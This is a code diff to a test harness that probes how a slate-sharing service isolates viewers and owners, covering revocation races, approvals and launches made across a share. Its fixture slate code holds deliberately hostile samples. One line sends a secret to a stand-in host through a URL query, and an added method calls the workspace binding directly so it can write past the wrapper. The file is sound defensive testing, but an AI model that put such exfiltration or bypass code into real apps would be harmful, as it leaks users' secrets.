@@ -164,6 +164,12 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
   private readonly galleryTold: string[] = [];
   /** Each viewer's own account, as their parts reach it. */
   private readonly accounts = new FakeViewerAccounts();
+  /** The notes slate's share (`startParts`). */
+  private notesShare = '';
+  /** Holds a launch where it asks for the owner's browser, until let go (`launchAcrossShare`). */
+  private actorGate: { readonly gate: Promise<undefined>; readonly reached: (value: undefined) => void } | null = null;
+  /** How many launches asked for the owner's browser. */
+  private actorCalls = 0;
   /** The run the last part call named, as its process's binding sent it. */
   private lastPartRun: string | null = null;
 
@@ -246,7 +252,17 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
         ...probeDurableApps(facets),
         url: async (port) => ({ url: `https://${String(port)}.preview.test/` }),
       },
-      browserActor: async (caller) => (caller.share === undefined ? PROBE_ACTOR : null),
+      browserActor: async (caller) => {
+        this.actorCalls += 1;
+        const held = this.actorGate;
+
+        if (held !== null) {
+          held.reached(undefined);
+          await held.gate;
+        }
+
+        return caller.share === undefined ? PROBE_ACTOR : null;
+      },
       catalog: async () => ({ mcp: MCP, slates: Object.keys(await this.host.controller.projects(ROOT_SLATE_CALLER)) }),
       shareUrl: async (handle) => `https://${handle}.share.test/`,
       shareEntry: () => null,
@@ -300,6 +316,8 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
       '  async probe() { return await this.env.workspace.readFile("/x"); }',
       '  async mutate() { return await this.env.workspace.writeFile("/x", "y"); }',
       '  async hop() { return await this.env.workspace.slates.digest.digest(); }',
+      // Straight to its binding, naming no request: the runner's wrapper is the slate's own code, never a boundary.
+      '  async raw() { const { env } = await import("cloudflare:workers"); const answer = await env.workspace.call(["writeFile"], ["/x", "raw"], null); if (!answer.ok) throw new Error(answer.error); return "raw wrote"; }',
       '  async fetch() { return new Response("share-ok"); }',
       '}',
     ].join('\n'));
@@ -618,6 +636,61 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     return { probe, mutate };
   }
 
+  /** One method of the board, called as a viewer of the share `handle`: its answer, or its refusal in its words. */
+  async viewerCall(handle: string, claim: ShareViewerClaim, method: string): Promise<string> {
+    const stub = slateBatchStub<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(
+      { request: (request) => this.host.routeShare(handle, claim, request, '/__rpc') }, 'ignored',
+    );
+
+    const answer = await refusedText(stub[method]?.() ?? Promise.resolve(null));
+
+    stub[Symbol.dispose]();
+
+    return answer;
+  }
+
+  /**
+   * A viewer's request this host admitted and still holds (a socket's), whose slate's last share is then revoked: the
+   * call it makes after is answered as the host answers it then.
+   */
+  async viewerAfterLastRevoke(handle: string, claim: ShareViewerClaim, share: string): Promise<SlateSurfaceResult> {
+    const admitted = await this.host.admitViewerRequest({ handle, claim, pathname: '/' });
+
+    if (admitted instanceof Response) throw new Error(`not admitted: ${admitted.status}`);
+    this.host.controller.live.revoke(share);
+
+    return await this.host.surfaceCall(ROOT_SLATE_CALLER, SLATE_ID, 'workspace', { path: ['readFile'], args: ['/x'], invocation: admitted.invocation });
+  }
+
+  /**
+   * An unshared launch of the board held where it chooses its network (the owner's browser), shared on each person's
+   * own access meanwhile, then let go: whether the server that runs then holds the owner's browser.
+   */
+  async launchAcrossShare(): Promise<{ actors: number; afterShare: number; refused: string; running: number }> {
+    await this.exerciseBoard();
+    await this.host.controller.processes.stopWhere((running) => running.id === SLATE_ID);
+    // What runs without the board: the race leaves nothing of the board's beside it.
+    const without = this.processes.getRunning().length;
+    const gate = Promise.withResolvers<undefined>();
+    const reached = Promise.withResolvers<undefined>();
+
+    this.actorGate = { gate: gate.promise, reached: reached.resolve };
+    this.actorCalls = 0;
+    const call = this.host.call({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, method: 'probe', args: [] });
+
+    await reached.promise;
+    await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'share', id: SLATE_ID, visibility: 'public', approved: [] });
+    const actors = this.actorCalls;
+
+    this.actorGate = null;
+    gate.resolve(undefined);
+    const answered = await call;
+
+    const running = this.processes.getRunning().length - without;
+
+    return { actors, afterShare: this.actorCalls, refused: answered.ok ? JSON.stringify(answered.value) : answered.error, running };
+  }
+
   async viewerBatch(handle: string, claim: ShareViewerClaim): Promise<{ probe: string | null; mutateError: string }> {
     const stub = slateBatchStub<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(
       { request: (request) => this.host.routeShare(handle, claim, request, '/__rpc') }, 'ignored',
@@ -691,7 +764,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
       slate: {
         title: 'Notes', runtime: 'worker',
         parts: {
-          mine: { fn: 'mine', show: 'showed' }, leaky: { fn: 'leaky' }, egress: { fn: 'egress' }, stash: { fn: 'stash' },
+          mine: { fn: 'mine', show: 'showed' }, leaky: { fn: 'leaky' }, egress: { fn: 'egress' }, stash: { fn: 'stash' }, two: { fn: 'two' },
           act: { fn: 'act', input: { kind: 'text', maxLength: 100 } },
         },
       },
@@ -700,6 +773,8 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     await this.host.call({ caller: ROOT_SLATE_CALLER, id: NOTES, method: 'board', args: [] });
     const shared = await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'share', id: NOTES, visibility: 'users', approved: [] });
     const share = v.parse(v.object({ ok: v.literal(true), value: v.object({ share: v.object({ id: v.string() }) }) }), shared).value.share.id;
+
+    this.notesShare = share;
 
     this.host.controller.live.addUsers(share, ['alice', 'bob'].map(viewerNamed).map((viewer) => ({ userId: viewer.userId, email: viewer.email })));
     // Shared, it is built from its own tree: that build is the revision its viewers consent at.
@@ -731,6 +806,22 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
 
   dispatched(): string[] {
     return [...this.accounts.dispatched];
+  }
+
+  /** The notes share on the owner's access instead, at the revision it runs. */
+  notesOnOwnerAccess(): void {
+    const share = this.host.controller.live.live(this.notesShare);
+
+    this.host.controller.live.setAuthority(share.id, { mode: 'owner', grantRevision: this.revision() }, share.grant);
+  }
+
+  /** The notes share revoked while the next connection call is out at its viewer's account. */
+  revokeDuringNextCall(): void {
+    this.accounts.duringNext = () => { this.host.controller.live.revoke(this.notesShare); };
+  }
+
+  async runPartApproved(viewer: string, part: string, approval: string): Promise<PartRunAnswer | null> {
+    return await this.host.parts.run(viewerNamed(viewer), NOTES, part, { args: [], action: null, approval });
   }
 
   async runPart(viewer: string | null, part: string, args: JsonValue[] = [], action: PartRunRequest['action'] = null): Promise<PartRunAnswer | null> {
@@ -822,6 +913,12 @@ const NOTES_SOURCE = [
   '    return { html: "<p>" + await this.env.workspace.mcp.Fetch.get({ url: "https://author.example/?d=" + read.secret }) + "</p>" };',
   '  }',
   '  async stash() { const before = kept; kept = (await issue(this.env)).secret; return { html: "<p>" + before + "</p>" }; }',
+  // Two calls that may each reach anywhere, one after the other: each waits on its own approval, and each runs once.
+  '  async two() {',
+  '    const first = await this.env.workspace.mcp.Fetch.get({ url: "https://a.example/" });',
+  '    const second = await this.env.workspace.mcp.Fetch.get({ url: "https://b.example/" });',
+  '    return { html: "<p>" + first + " then " + second + "</p>" };',
+  '  }',
   '  async act(title) { await this.env.workspace.mcp.GitHub.create_issue({ owner: "acme", repo: "notes", title }); return { html: "<p>acted</p>" }; }',
   // The shared server: what was shown, and its own SQL, which no part ever wrote.
   '  async board() { return (await this.storage.get("shown")) ?? null; }',
